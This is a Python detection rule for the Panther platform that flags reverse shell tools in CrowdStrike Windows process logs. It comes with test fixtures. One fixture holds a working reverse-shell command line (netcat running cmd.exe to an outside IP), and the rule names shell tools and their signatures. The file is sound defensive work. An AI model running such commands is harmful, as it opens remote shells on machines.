from typing import List

from pypanther.base import PantherRule, PantherRuleTest, PantherSeverity
from pypanther.helpers.panther_base_helpers import crowdstrike_detection_alert_context, deep_get
from pypanther.log_types import LogType

crowdstrike_reverse_shell_tool_executed_tests: List[PantherRuleTest] = [
    PantherRuleTest(
        Name="Malicious Netcat",
        ExpectedResult=True,
        Log={
            "aid": "1234abcd4567efghi8901abc",
            "aip": "11.10.9.8",
            "cid": "abc987jkl654mnop321",
            "configbuild": "1007.3.0016606.11",
            "configstatehash": "3799024366",
            "entitlements": "15",
            "event": {
                "AuthenticationId": "293628",
                "AuthenticodeHashData": "5540c470218d209b7c3eca3d12e190580814d566",
                "CommandLine": "C:\\Windows\\System32\\nc.exe -e cmd.exe 1.1.1.1 80",
                "ConfigBuild": "1007.3.0016606.11",
                "ConfigStateHash": "3799024366",
                "EffectiveTransmissionClass": "2",
                "Entitlements": "15",
                "ImageFileName": "\\Device\\HarddiskVolume2\\Windows\\System32\\nc.exe",
                "ImageSubsystem": "3",
                "IntegrityLevel": "12288",
                "MD5HashData": "5fd22b915c232378e567160d641cc9f2",
                "ParentAuthenticationId": "293628",
                "ParentBaseFileName": "pwsh.exe",
                "ParentProcessId": "4370948876",
                "ProcessCreateFlags": "0",
                "ProcessEndTime": "",
                "ProcessParameterFlags": "24577",
                "ProcessStartTime": "1682106752.006",
                "ProcessSxsFlags": "64",
                "RawProcessId": "1468",
                "SHA1HashData": "0000000000000000000000000000000000000000",
                "SHA256HashData": "488e74e2026d03f21b33f470c23b3de2f466643186c2e06ae7b4883cc2e59377",
                "SessionId": "2",
                "SignInfoFlags": "8683538",
                "SourceProcessId": "4370948876",
                "SourceThreadId": "6364981533",
                "Tags": "25, 27, 40, 151, 874, 924, 12094627905582, 12094627906234, 237494511599633",
                "TargetProcessId": "4390327988",
                "TokenType": "1",
                "TreeId": "4295752857",
                "UserSid": "S-1-5-21-239183934-720705223-383019856-500",
                "aid": "1234abcd4567efghi8901abc",
                "aip": "11.10.9.8",
                "cid": "abc987jkl654mnop321",
                "event_platform": "Win",
                "event_simpleName": "ProcessRollup2",
                "id": "081d64d7-17fb-40c0-8767-48ff1e2ee2dd",
                "name": "ProcessRollup2V19",
                "timestamp": "1682106752722",
            },
            "event_platform": "Win",
            "event_simplename": "ProcessRollup2",
            "fdr_event_type": "ProcessRollup2",
            "id": "081d64d7-17fb-40c0-8767-48ff1e2ee2dd",
            "name": "ProcessRollup2V19",
            "p_any_ip_addresses": ["11.10.9.8"],
            "p_any_md5_hashes": [
                "5fd22b915c232378e567160d641cc9f2",
                "1234abcd4567efghi8901abc",
                "abc987jkl654mnop321",
            ],
            "p_any_sha1_hashes": ["0000000000000000000000000000000000000000"],
            "p_any_sha256_hashes": [
                "488e74e2026d03f21b33f470c23b3de2f466643186c2e06ae7b4883cc2e59377"
            ],
            "p_any_trace_ids": ["4295752857", "1234abcd4567efghi8901abc", "abc987jkl654mnop321"],
            "p_event_time": "2023-04-21 19:52:32.722",
            "p_log_type": "Crowdstrike.FDREvent",
            "p_parse_time": "2023-04-21 20:05:52.94",
            "p_row_id": "7ac82dbb43a99bfec196bdda178c8101",
            "p_schema_version": 0,
            "p_source_id": "1f33f64c-124d-413c-a9e3-d51ccedd8e77",
            "p_source_label": "Crowdstrike-FDR-Dev",
            "timestamp": "2023-04-21 19:52:32.722",
            "treeid": "4295752857",
        },
    ),
    PantherRuleTest(
        Name="Benign Netcat",
        ExpectedResult=False,
        Log={
            "aid": "1234abcd4567efghi8901abc",
            "aip": "11.10.9.8",
            "cid": "abc987jkl654mnop321",
            "configbuild": "1007.3.0016606.11",
            "configstatehash": "3799024366",
            "entitlements": "15",
            "event": {
                "AuthenticationId": "293628",
                "AuthenticodeHashData": "5540c470218d209b7c3eca3d12e190580814d566",
                "CommandLine": "C:\\Windows\\System32\\nc.exe -n 1.1.1.1 80",
                "ConfigBuild": "1007.3.0016606.11",
                "ConfigStateHash": "3799024366",
                "EffectiveTransmissionClass": "2",
                "Entitlements": "15",
                "ImageFileName": "\\Device\\HarddiskVolume2\\Windows\\System32\\nc.exe",
                "ImageSubsystem": "3",
                "IntegrityLevel": "12288",
                "MD5HashData": "5fd22b915c232378e567160d641cc9f2",
                "ParentAuthenticationId": "293628",
                "ParentBaseFileName": "pwsh.exe",
                "ParentProcessId": "4370948876",
                "ProcessCreateFlags": "0",
                "ProcessEndTime": "",
                "ProcessParameterFlags": "24577",
                "ProcessStartTime": "1682106752.006",
                "ProcessSxsFlags": "64",
                "RawProcessId": "1468",
                "SHA1HashData": "0000000000000000000000000000000000000000",
                "SHA256HashData": "488e74e2026d03f21b33f470c23b3de2f466643186c2e06ae7b4883cc2e59377",
                "SessionId": "2",
                "SignInfoFlags": "8683538",
                "SourceProcessId": "4370948876",
                "SourceThreadId": "6364981533",
                "Tags": "25, 27, 40, 151, 874, 924, 12094627905582, 12094627906234, 237494511599633",
                "TargetProcessId": "4390327988",
                "TokenType": "1",
                "TreeId": "4295752857",
                "UserSid": "S-1-5-21-239183934-720705223-383019856-500",
                "aid": "1234abcd4567efghi8901abc",
                "aip": "11.10.9.8",
                "cid": "abc987jkl654mnop321",
                "event_platform": "Win",
                "event_simpleName": "ProcessRollup2",
                "id": "081d64d7-17fb-40c0-8767-48ff1e2ee2dd",
                "name": "ProcessRollup2V19",
                "timestamp": "1682106752722",
            },
            "event_platform": "Win",
            "event_simplename": "ProcessRollup2",
            "fdr_event_type": "ProcessRollup2",
            "id": "081d64d7-17fb-40c0-8767-48ff1e2ee2dd",
            "name": "ProcessRollup2V19",
            "p_any_ip_addresses": ["11.10.9.8"],
            "p_any_md5_hashes": [
                "5fd22b915c232378e567160d641cc9f2",
                "1234abcd4567efghi8901abc",
                "abc987jkl654mnop321",
            ],
            "p_any_sha1_hashes": ["0000000000000000000000000000000000000000"],
            "p_any_sha256_hashes": [
                "488e74e2026d03f21b33f470c23b3de2f466643186c2e06ae7b4883cc2e59377"
            ],
            "p_any_trace_ids": ["4295752857", "1234abcd4567efghi8901abc", "abc987jkl654mnop321"],
            "p_event_time": "2023-04-21 19:52:32.722",
            "p_log_type": "Crowdstrike.FDREvent",
            "p_parse_time": "2023-04-21 20:05:52.94",
            "p_row_id": "7ac82dbb43a99bfec196bdda178c8101",
            "p_schema_version": 0,
            "p_source_id": "1f33f64c-124d-413c-a9e3-d51ccedd8e77",
            "p_source_label": "Crowdstrike-FDR-Dev",
            "timestamp": "2023-04-21 19:52:32.722",
            "treeid": "4295752857",
        },
    ),
    PantherRuleTest(
        Name="Other",
        ExpectedResult=False,
        Log={
            "aid": "1234abcd4567efghi8901abc",
            "aip": "11.10.9.8",
            "cid": "abc987jkl654mnop321",
            "configbuild": "1007.3.0016606.11",
            "configstatehash": "3799024366",
            "entitlements": "15",
            "event": {
                "AuthenticationId": "293628",
                "AuthenticodeHashData": "5540c470218d209b7c3eca3d12e190580814d566",
                "CommandLine": "C:\\Windows\\System32\\ethminer.exe",
                "ConfigBuild": "1007.3.0016606.11",
                "ConfigStateHash": "3799024366",
                "EffectiveTransmissionClass": "2",
                "Entitlements": "15",
                "ImageFileName": "\\Device\\HarddiskVolume2\\Windows\\System32\\ethminer.exe",
                "ImageSubsystem": "3",
                "IntegrityLevel": "12288",
                "MD5HashData": "5fd22b915c232378e567160d641cc9f2",
                "ParentAuthenticationId": "293628",
                "ParentBaseFileName": "pwsh.exe",
                "ParentProcessId": "4370948876",
                "ProcessCreateFlags": "0",
                "ProcessEndTime": "",
                "ProcessParameterFlags": "24577",
                "ProcessStartTime": "1682106752.006",
                "ProcessSxsFlags": "64",
                "RawProcessId": "1468",
                "SHA1HashData": "0000000000000000000000000000000000000000",
                "SHA256HashData": "488e74e2026d03f21b33f470c23b3de2f466643186c2e06ae7b4883cc2e59377",
                "SessionId": "2",
                "SignInfoFlags": "8683538",
                "SourceProcessId": "4370948876",
                "SourceThreadId": "6364981533",
                "Tags": "25, 27, 40, 151, 874, 924, 12094627905582, 12094627906234, 237494511599633",
                "TargetProcessId": "4390327988",
                "TokenType": "1",
                "TreeId": "4295752857",
                "UserSid": "S-1-5-21-239183934-720705223-383019856-500",
                "aid": "1234abcd4567efghi8901abc",
                "aip": "11.10.9.8",
                "cid": "abc987jkl654mnop321",
                "event_platform": "Win",
                "event_simpleName": "ProcessRollup2",
                "id": "081d64d7-17fb-40c0-8767-48ff1e2ee2dd",
                "name": "ProcessRollup2V19",
                "timestamp": "1682106752722",
            },
            "event_platform": "Win",
            "event_simplename": "ProcessRollup2",
            "fdr_event_type": "ProcessRollup2",
            "id": "081d64d7-17fb-40c0-8767-48ff1e2ee2dd",
            "name": "ProcessRollup2V19",
            "p_any_ip_addresses": ["11.10.9.8"],
            "p_any_md5_hashes": [
                "5fd22b915c232378e567160d641cc9f2",
                "1234abcd4567efghi8901abc",
                "abc987jkl654mnop321",
            ],
            "p_any_sha1_hashes": ["0000000000000000000000000000000000000000"],
            "p_any_sha256_hashes": [
                "488e74e2026d03f21b33f470c23b3de2f466643186c2e06ae7b4883cc2e59377"
            ],
            "p_any_trace_ids": ["4295752857", "1234abcd4567efghi8901abc", "abc987jkl654mnop321"],
            "p_event_time": "2023-04-21 19:52:32.722",
            "p_log_type": "Crowdstrike.FDREvent",
            "p_parse_time": "2023-04-21 20:05:52.94",
            "p_row_id": "7ac82dbb43a99bfec196bdda178c8101",
            "p_schema_version": 0,
            "p_source_id": "1f33f64c-124d-413c-a9e3-d51ccedd8e77",
            "p_source_label": "Crowdstrike-FDR-Dev",
            "timestamp": "2023-04-21 19:52:32.722",
            "treeid": "4295752857",
        },
    ),
]


class CrowdstrikeReverseShellToolExecuted(PantherRule):
    Description = (
        "Detects usage of tools commonly used to to establish reverse shells on Windows machines."
    )
    DisplayName = "Crowdstrike Reverse Shell Tool Executed"
    Reference = "https://attack.mitre.org/techniques/T1059/"
    Severity = PantherSeverity.High
    LogTypes = [LogType.Crowdstrike_FDREvent]
    RuleID = "Crowdstrike.Reverse.Shell.Tool.Executed-prototype"
    Tests = crowdstrike_reverse_shell_tool_executed_tests
    #   process name: reverse shell signature
    REMOTE_SHELL_TOOLS = {
        "nc.exe": ["cmd.exe", "powershell.exe", "command.exe"],
        "ncat.exe": ["cmd.exe", "powershell.exe", "command.exe"],
        "socat.exe": ["cmd.exe", "powershell.exe", "command.exe"],
        "psexec.exe": ["cmd.exe", "powershell.exe", "command.exe"],
        "python.exe": ["cmd.exe", "powershell.exe", "command.exe"],
        "powershell.exe": ["System.Net.Sockets.TcpClient"],
        "certutil.exe": ["-urlcache"],
        "php.exe": ["fsockopen", "cmd.exe", "powershell.exe", "command.exe"],
    }

    def rule(self, event):
        if event.get("fdr_event_type", "") == "ProcessRollup2":
            if event.get("event_platform", "") == "Win":
                process_name = (
                    deep_get(event, "event", "ImageFileName", default="").lower().split("\\")[-1]
                )
                command_line = deep_get(event, "event", "CommandLine", default="")
                signatures = self.REMOTE_SHELL_TOOLS.get(process_name, [])
                for signature in signatures:
                    if signature in command_line:
                        return True
        return False

    def title(self, event):
        tool = (
            deep_get(event, "event", "ImageFileName", default="<TOOL_NOT_FOUND>")
            .lower()
            .split("\\")[-1]
        )
        aid = event.get("aid", "<AID_NOT_FOUND>")
        return f"Crowdstrike: Reverse shell tool [{tool}] detected on aid [{aid}]"

    def alert_context(self, event):
        return crowdstrike_detection_alert_context(event)
